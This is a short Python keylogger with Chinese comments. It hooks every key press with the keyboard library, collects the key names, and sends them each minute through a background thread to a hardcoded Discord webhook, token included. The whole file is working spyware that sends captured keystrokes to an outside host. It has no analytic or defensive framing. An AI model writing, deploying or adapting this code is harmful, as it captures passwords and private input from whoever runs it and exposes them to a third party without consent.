#======//import\\======
import keyboard
import requests
import time
import threading
#======\\import//======

#======//全域變數\\======
WEBHOOK_URL = "https://discord.com/api/webhooks/1415534715032567828/zgGU_mMASlaMTqhlMo_IC3xBVFvoHMI8C6XWucMnBpGaS_2E59a9kKw3zZpatXXma4Gi"
key_events = []  # 用來儲存一分鐘內的所有按鍵事件
last_send_time = time.time()  # 記錄上次發送的時間
#======\\全域變數//======

#======//webhook\\------
def send_webhook(keys):
    payload = {"content": f"這一分鐘內按下了: {', '.join(keys)}"}  # 發送按鍵事件列表
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
        print(f"Webhook 已發送: {keys}")
    except Exception as e:
        print("Webhook 發送失敗：", e)
#------\\webhook//------

#======//檢查時間並發送按鍵事件\\======
def check_and_send():
    global last_send_time, key_events
    while True:
        time.sleep(60)  # 每 60 秒檢查一次
        current_time = time.time()
        if current_time - last_send_time >= 60:  # 超過 60 秒
            if key_events:
                send_webhook(key_events)  # 發送所有儲存的按鍵事件
                key_events = []  # 清空已發送的事件
            last_send_time = current_time  # 更新發送時間
#======\\檢查時間並發送按鍵事件//======
  
#======//key_event\\------
def key_press(event):
    global key_events
    print(event.name)
    key_events.append(event.name)  # 儲存按鍵事件

#------\\key_event//------

# 開啟一個線程來每分鐘發送一次按鍵事件
thread = threading.Thread(target=check_and_send)
thread.daemon = False  # 設置為守護線程，程序結束時會自動關閉
thread.start()

keyboard.on_press(key_press)
print("LRU EPTL")
keyboard.wait()
